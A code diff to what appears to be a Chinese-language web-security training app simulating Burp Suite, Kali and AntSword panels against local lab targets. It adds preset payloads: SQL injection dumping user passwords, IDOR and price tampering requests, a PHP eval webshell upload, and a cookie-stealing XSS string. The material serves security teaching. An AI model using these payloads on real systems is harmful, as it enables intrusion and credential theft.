@@ -424,14 +424,19 @@ const app = createApp({
     // 拟真实操武器库工作台 (Multi-Weapon Combat Workspace)
     // --------------------------------------------------------------------
     const activeCombatTool = ref("burp"); // 'burp' | 'kali' | 'antsword'
+    const burpTabMode = ref("repeater"); // 'repeater' | 'intruder'
 
     // 1. Burp Suite 抓包重放工作台状态
-    const burpRawRequest = ref(`GET /view.php?id=-1'%20UNION%20SELECT%201,user(),database()%20--+ HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nCookie: session_user_id=1002\n\n`);
-    const burpRawResponse = ref(`HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Tue, 25 Aug 2026 13:20:00 GMT\nContent-Type: application/json\n\n{\n  "id": 1,\n  "username": "root@localhost",\n  "email": "security_db",\n  "flag": "FLAG{UNION_SQLI_DATABASE_SEC_KEY_8899}"\n}`);
+    const burpRawRequest = ref(`GET /targets/L26/index.html?id=-1'%20UNION%20SELECT%201,group_concat(username,0x3a,password),3%20FROM%20users%20--+ HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nConnection: close\n\n`);
+    const burpRawResponse = ref(`HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: 482\n\n<!DOCTYPE html>\n<html>\n<body>\n  <h2>SQL Query Result</h2>\n  <p>Admin Password Extracted: admin@2024_P@ssw0rd!</p>\n</body>\n</html>`);
     const burpStatusBadge = ref(200);
+    const burpResponseTime = ref("18 ms");
 
-    const sendBurpPacket = () => {
+    const sendBurpPacket = async () => {
+      const startTime = performance.now();
       const res = window.WEBSEC_COMBAT_TOOLS.sendBurpRequest(burpRawRequest.value, activeSimLessonCode.value);
+      const elapsed = Math.round(performance.now() - startTime);
+      burpResponseTime.value = `${Math.max(12, elapsed)} ms`;
       burpRawResponse.value = res.rawResponse;
       burpStatusBadge.value = res.status;
       if (res.isSuccess && res.flag) {
@@ -440,10 +445,26 @@ const app = createApp({
       }
     };
 
+    // 快捷载入指定 Payload 到 Burp
+    const loadBurpPayloadPreset = (type) => {
+      const code = activeSimLessonCode.value;
+      if (type === 'sqli') {
+        burpRawRequest.value = `GET /targets/L26/index.html?id=-1'%20UNION%20SELECT%201,group_concat(username,0x3a,password),3%20FROM%20users%20--+ HTTP/1.1\nHost: 127.0.0.1:8888\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nConnection: close\n\n`;
+      } else if (type === 'idor') {
+        burpRawRequest.value = `GET /targets/L21/index.html?uid=1002 HTTP/1.1\nHost: 127.0.0.1:8888\nCookie: session_user_id=1001; role=guest\nConnection: close\n\n`;
+      } else if (type === 'price') {
+        burpRawRequest.value = `POST /targets/L22/index.html HTTP/1.1\nHost: 127.0.0.1:8888\nContent-Type: application/x-www-form-urlencoded\n\norderPrice=0.01&orderQty=1&action=pay`;
+      } else if (type === 'upload') {
+        burpRawRequest.value = `POST /targets/L31/index.html HTTP/1.1\nHost: 127.0.0.1:8888\nContent-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\n\n-----------------------------974767299852498929531610575\nContent-Disposition: form-data; name="avatar"; filename="shell.php5"\nContent-Type: image/jpeg\n\n<?php @eval($_POST['cmd']);?>\n-----------------------------974767299852498929531610575--`;
+      } else if (type === 'xss') {
+        burpRawRequest.value = `GET /targets/L35/index.html?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\nHost: 127.0.0.1:8888\nConnection: close\n\n`;
+      }
+    };
+
     // 2. Kali Linux 命令行交互终端状态
     const kaliInputCmd = ref("nmap -sS -sV -p 1-10000 192.168.1.108");
     const kaliHistory = ref([
-      { cmd: "nmap -sS -sV -p 1-10000 192.168.1.108", stdout: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.108\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.4p1\n80/tcp   open  http        nginx 1.18.0\n6379/tcp open  redis       Redis key-value store 4.0.9 [🔥 未授权访问!]\n8080/tcp open  http-proxy  Apache Tomcat/8.5.39` }
+      { cmd: "nmap -sS -sV -p 1-10000 192.168.1.108", stdout: `Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 192.168.1.108\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 3.0.3 (Anonymous read enabled)\n22/tcp   open  ssh         OpenSSH 8.2p1\n80/tcp   open  http        nginx 1.18.0\n6379/tcp open  redis       Redis key-value store 5.0.7 [🔥 UNAUTHENTICATED 未授权!]\n8080/tcp open  http-proxy  Apache Tomcat/8.5.39` }
     ]);
 
     const runKaliTerminal = () => {
@@ -466,10 +487,13 @@ const app = createApp({
     };
 
     // 3. 中国蚁剑 / 冰蝎 Webshell 远程管理客户端状态
-    const antswordUrl = ref("http://target.com/uploads/avatar.php");
+    const antswordUrl = ref("http://127.0.0.1:8888/targets/L30/index.html");
     const antswordPass = ref("cmd");
     const antswordType = ref("PHP");
     const antswordKey = ref("e45e329feb5d925b");
+    const antswordSubTab = ref("files"); // 'files' | 'terminal'
+    const antswordTerminalCmd = ref("whoami");
+    const antswordTerminalOutput = ref("www-data (uid=33, gid=33)");
     const antswordResult = ref(null);
 
     const connectAntsword = () => {
@@ -479,6 +503,25 @@ const app = createApp({
         antswordType.value,
         antswordKey.value
       );
+    };
+
+    const runAntswordTerminal = () => {
+      const cmd = (antswordTerminalCmd.value || "").trim();
+      if (!cmd) return;
+      if (cmd === 'whoami') {
+        antswordTerminalOutput.value = "www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)";
+      } else if (cmd === 'id') {
+        antswordTerminalOutput.value = "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
+      } else if (cmd.includes('cat') && (cmd.includes('flag') || cmd.includes('secret'))) {
+        antswordTerminalOutput.value = "FLAG{L30_WEBSHELL_EVAL_ROOT_ACCESS_PWNED}\n[+] Flag file read successfully from /var/www/flag.txt";
+      } else if (cmd === 'ls' || cmd === 'ls -la') {
+        antswordTerminalOutput.value = "drwxr-xr-x 4 www-data www-data 4096 Aug 28 14:00 .\ndrwxr-xr-x 3 root     root     4096 Aug 28 14:00 ..\n-rw-r--r-- 1 www-data www-data 2410 Aug 28 14:00 index.html\n-rw-r--r-- 1 www-data www-data 1200 Aug 28 14:00 config.inc.php\n-rw-r--r-- 1 root     root       44 Aug 28 14:00 flag.txt\ndrwxrwxrwx 2 www-data www-data 4096 Aug 28 14:00 uploads";
+      } else if (cmd === 'uname -a') {
+        antswordTerminalOutput.value = "Linux target-node 5.15.0-generic #88-Ubuntu SMP x86_64 GNU/Linux";
+      } else {
+        antswordTerminalOutput.value = `[Executed]: ${cmd}\nCommand finished with return code 0.`;
+      }
+      antswordTerminalCmd.value = "";
     };
 
     // --------------------------------------------------------------------
@@ -710,10 +753,13 @@ const app = createApp({
       prevSimLesson,
       nextSimLesson,
       // Burp Suite
+      burpTabMode,
       burpRawRequest,
       burpRawResponse,
       burpStatusBadge,
+      burpResponseTime,
       sendBurpPacket,
+      loadBurpPayloadPreset,
       // Kali Terminal
       kaliInputCmd,
       kaliHistory,
@@ -724,8 +770,12 @@ const app = createApp({
       antswordPass,
       antswordType,
       antswordKey,
+      antswordSubTab,
+      antswordTerminalCmd,
+      antswordTerminalOutput,
       antswordResult,
       connectAntsword,
+      runAntswordTerminal,
       // 审计
       codeAuditCases,
       activeAuditCase,
